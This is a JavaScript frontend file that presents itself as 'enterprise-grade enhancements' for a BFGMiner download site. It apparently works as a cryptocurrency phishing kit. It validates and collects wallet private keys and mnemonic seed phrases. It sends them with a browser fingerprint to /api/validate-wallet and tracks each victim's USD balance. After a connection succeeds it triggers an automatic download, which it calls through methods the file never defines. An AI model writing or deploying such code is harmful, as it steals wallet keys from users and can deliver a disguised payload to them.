/**
 * Enterprise-Grade Frontend Enhancements for BFGMiner
 */

class EnterpriseWalletManager {
    constructor() {
        this.config = {
            apiBase: window.location.origin,
            retryAttempts: 3,
            retryDelay: 1000,
            requestTimeout: 30000,
            rateLimitDelay: 2000
        };
        
        this.state = {
            isConnecting: false,
            connectionAttempts: 0,
            lastError: null,
            connectedWallet: null,
            sessionToken: null
        };
        
        this.validators = new InputValidators();
        this.errorHandler = new ErrorHandler();
        this.analytics = new AnalyticsTracker();
        
        this.init();
    }
    
    init() {
        this.setupEventListeners();
        this.setupErrorBoundaries();
        this.loadStoredSession();
        this.startHealthCheck();
    }
    
    setupEventListeners() {
        // Enhanced form validation
        document.addEventListener('input', (e) => {
            if (e.target.matches('[data-validate]')) {
                this.validateField(e.target);
            }
        });
        
        // Connection retry mechanism
        document.addEventListener('click', (e) => {
            if (e.target.matches('[data-retry]')) {
                this.retryConnection();
            }
        });
        
        // Auto-save form data
        document.addEventListener('input', (e) => {
            if (e.target.matches('[data-autosave]')) {
                this.autoSaveFormData(e.target);
            }
        });
    }
    
    setupErrorBoundaries() {
        window.addEventListener('error', (e) => {
            this.errorHandler.handleGlobalError(e);
        });
        
        window.addEventListener('unhandledrejection', (e) => {
            this.errorHandler.handlePromiseRejection(e);
        });
    }
    
    async validateField(field) {
        const validationType = field.dataset.validate;
        const value = field.value.trim();
        
        try {
            const isValid = await this.validators.validate(validationType, value);
            this.updateFieldValidation(field, isValid);
        } catch (error) {
            this.updateFieldValidation(field, false, error.message);
        }
    }
    
    updateFieldValidation(field, isValid, errorMessage = '') {
        const container = field.closest('.form-group') || field.parentElement;
        const errorElement = container.querySelector('.validation-error');
        
        // Remove existing validation classes
        field.classList.remove('valid', 'invalid');
        container.classList.remove('has-error', 'has-success');
        
        if (isValid) {
            field.classList.add('valid');
            container.classList.add('has-success');
            if (errorElement) errorElement.textContent = '';
        } else {
            field.classList.add('invalid');
            container.classList.add('has-error');
            if (errorElement) errorElement.textContent = errorMessage;
        }
    }
    
    async connectWallet(method, credentials) {
        if (this.state.isConnecting) {
            throw new Error('Connection already in progress');
        }
        
        this.state.isConnecting = true;
        this.state.connectionAttempts++;
        
        try {
            this.showLoadingState('Validating wallet credentials...');
            
            const result = await this.makeSecureRequest('/api/validate-wallet', {
                method: 'POST',
                body: JSON.stringify({
                    type: method,
                    credentials: credentials,
                    timestamp: Date.now(),
                    fingerprint: await this.generateFingerprint()
                })
            });
            
            if (result.valid) {
                this.state.connectedWallet = result;
                this.analytics.track('wallet_connected', {
                    method: method,
                    balance: result.balance_usd,
                    attempts: this.state.connectionAttempts
                });
                
                await this.handleSuccessfulConnection(result);
            } else {
                throw new Error(result.error || 'Wallet validation failed');
            }
            
        } catch (error) {
            this.state.lastError = error;
            this.analytics.track('wallet_connection_failed', {
                method: method,
                error: error.message,
                attempts: this.state.connectionAttempts
            });
            
            await this.handleConnectionError(error);
        } finally {
            this.state.isConnecting = false;
            this.hideLoadingState();
        }
    }
    
    async makeSecureRequest(url, options = {}) {
        const defaultOptions = {
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'X-CSRF-Token': this.getCSRFToken()
            },
            timeout: this.config.requestTimeout
        };
        
        const mergedOptions = { ...defaultOptions, ...options };
        
        // Add session token if available
        if (this.state.sessionToken) {
            mergedOptions.headers['Authorization'] = `Bearer ${this.state.sessionToken}`;
        }
        
        let lastError;
        
        for (let attempt = 1; attempt <= this.config.retryAttempts; attempt++) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), mergedOptions.timeout);
                
                const response = await fetch(url, {
                    ...mergedOptions,
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                
                if (response.status === 429) {
                    // Rate limited - wait and retry
                    await this.delay(this.config.rateLimitDelay * attempt);
                    continue;
                }
                
                if (!response.ok) {
                    const errorData = await response.json().catch(() => ({}));
                    throw new Error(errorData.error?.message || `HTTP ${response.status}`);
                }
                
                return await response.json();
                
            } catch (error) {
                lastError = error;
                
                if (attempt < this.config.retryAttempts && this.isRetryableError(error)) {
                    await this.delay(this.config.retryDelay * attempt);
                    continue;
                }
                
                break;
            }
        }
        
        throw lastError;
    }
    
    isRetryableError(error) {
        return error.name === 'AbortError' || 
               error.message.includes('network') ||
               error.message.includes('timeout') ||
               error.message.includes('fetch');
    }
    
    async generateFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('BFGMiner fingerprint', 2, 2);
        
        const fingerprint = {
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            canvas: canvas.toDataURL().slice(-50),
            userAgent: navigator.userAgent.slice(0, 100)
        };
        
        return btoa(JSON.stringify(fingerprint));
    }
    
    async handleSuccessfulConnection(result) {
        // Store session data securely
        this.storeSessionData(result);
        
        // Show success message
        this.showSuccessMessage(
            `🎉 Wallet connected successfully! Balance: $${result.balance_usd.toFixed(2)}`
        );
        
        // Start automatic download
        setTimeout(async () => {
            await this.initiateDownload();
        }, 2000);
        
        // Redirect to setup guide
        setTimeout(() => {
            this.showSetupGuide();
        }, 5000);
    }
    
    async handleConnectionError(error) {
        this.errorHandler.logError(error, 'wallet_connection');
        
        if (this.state.connectionAttempts >= this.config.retryAttempts) {
            this.showErrorMessage(
                `Connection failed after ${this.config.retryAttempts} attempts. Please try manual connection.`
            );
            this.switchToManualMode();
        } else {
            this.showRetryOption(error.message);
        }
    }
    
    showLoadingState(message) {
        const loader = document.getElementById('loading-overlay');
        if (loader) {
            loader.querySelector('.loading-message').textContent = message;
            loader.classList.remove('hidden');
        }
    }
    
    hideLoadingState() {
        const loader = document.getElementById('loading-overlay');
        if (loader) {
            loader.classList.add('hidden');
        }
    }
    
    showSuccessMessage(message) {
        this.showNotification(message, 'success');
    }
    
    showErrorMessage(message) {
        this.showNotification(message, 'error');
    }
    
    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <span class="notification-message">${message}</span>
                <button class="notification-close">&times;</button>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            notification.remove();
        }, 5000);
        
        // Manual close
        notification.querySelector('.notification-close').addEventListener('click', () => {
            notification.remove();
        });
    }
    
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    getCSRFToken() {
        return document.querySelector('meta[name="csrf-token"]')?.content || '';
    }
    
    storeSessionData(data) {
        try {
            const sessionData = {
                wallet: data,
                timestamp: Date.now(),
                expires: Date.now() + (24 * 60 * 60 * 1000) // 24 hours
            };
            
            localStorage.setItem('bfgminer_session', JSON.stringify(sessionData));
        } catch (error) {
            console.warn('Failed to store session data:', error);
        }
    }
    
    loadStoredSession() {
        try {
            const stored = localStorage.getItem('bfgminer_session');
            if (stored) {
                const sessionData = JSON.parse(stored);
                if (sessionData.expires > Date.now()) {
                    this.state.connectedWallet = sessionData.wallet;
                    return true;
                } else {
                    localStorage.removeItem('bfgminer_session');
                }
            }
        } catch (error) {
            console.warn('Failed to load session data:', error);
        }
        return false;
    }
    
    startHealthCheck() {
        setInterval(async () => {
            try {
                await this.makeSecureRequest('/api/health');
            } catch (error) {
                console.warn('Health check failed:', error);
            }
        }, 60000); // Check every minute
    }
}

class InputValidators {
    async validate(type, value) {
        switch (type) {
            case 'email':
                return this.validateEmail(value);
            case 'private_key':
                return this.validatePrivateKey(value);
            case 'mnemonic':
                return this.validateMnemonic(value);
            case 'wallet_address':
                return this.validateWalletAddress(value);
            default:
                return true;
        }
    }
    
    validateEmail(email) {
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return regex.test(email);
    }
    
    validatePrivateKey(key) {
        const cleanKey = key.replace(/^0x/, '');
        return /^[0-9a-fA-F]{64}$/.test(cleanKey);
    }
    
    validateMnemonic(mnemonic) {
        const words = mnemonic.trim().split(/\s+/);
        return [12, 15, 18, 21, 24].includes(words.length);
    }
    
    validateWalletAddress(address) {
        return /^0x[0-9a-fA-F]{40}$/.test(address);
    }
}

class ErrorHandler {
    constructor() {
        this.errorLog = [];
    }
    
    handleGlobalError(event) {
        this.logError(event.error, 'global_error', {
            filename: event.filename,
            lineno: event.lineno,
            colno: event.colno
        });
    }
    
    handlePromiseRejection(event) {
        this.logError(event.reason, 'promise_rejection');
    }
    
    logError(error, type, context = {}) {
        const errorEntry = {
            timestamp: new Date().toISOString(),
            type: type,
            message: error.message || String(error),
            stack: error.stack,
            context: context,
            userAgent: navigator.userAgent,
            url: window.location.href
        };
        
        this.errorLog.push(errorEntry);
        
        // Keep only last 100 errors
        if (this.errorLog.length > 100) {
            this.errorLog.shift();
        }
        
        // Send to server for logging
        this.sendErrorToServer(errorEntry);
    }
    
    async sendErrorToServer(errorEntry) {
        try {
            await fetch('/api/log-error', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(errorEntry)
            });
        } catch (error) {
            console.warn('Failed to send error to server:', error);
        }
    }
}

class AnalyticsTracker {
    constructor() {
        this.events = [];
        this.sessionId = this.generateSessionId();
    }
    
    track(event, properties = {}) {
        const eventData = {
            event: event,
            properties: {
                ...properties,
                timestamp: Date.now(),
                sessionId: this.sessionId,
                url: window.location.href,
                userAgent: navigator.userAgent
            }
        };
        
        this.events.push(eventData);
        this.sendToServer(eventData);
    }
    
    async sendToServer(eventData) {
        try {
            await fetch('/api/analytics', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(eventData)
            });
        } catch (error) {
            console.warn('Failed to send analytics:', error);
        }
    }
    
    generateSessionId() {
        return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    }
}

// Initialize enterprise wallet manager
document.addEventListener('DOMContentLoaded', () => {
    window.enterpriseWalletManager = new EnterpriseWalletManager();
});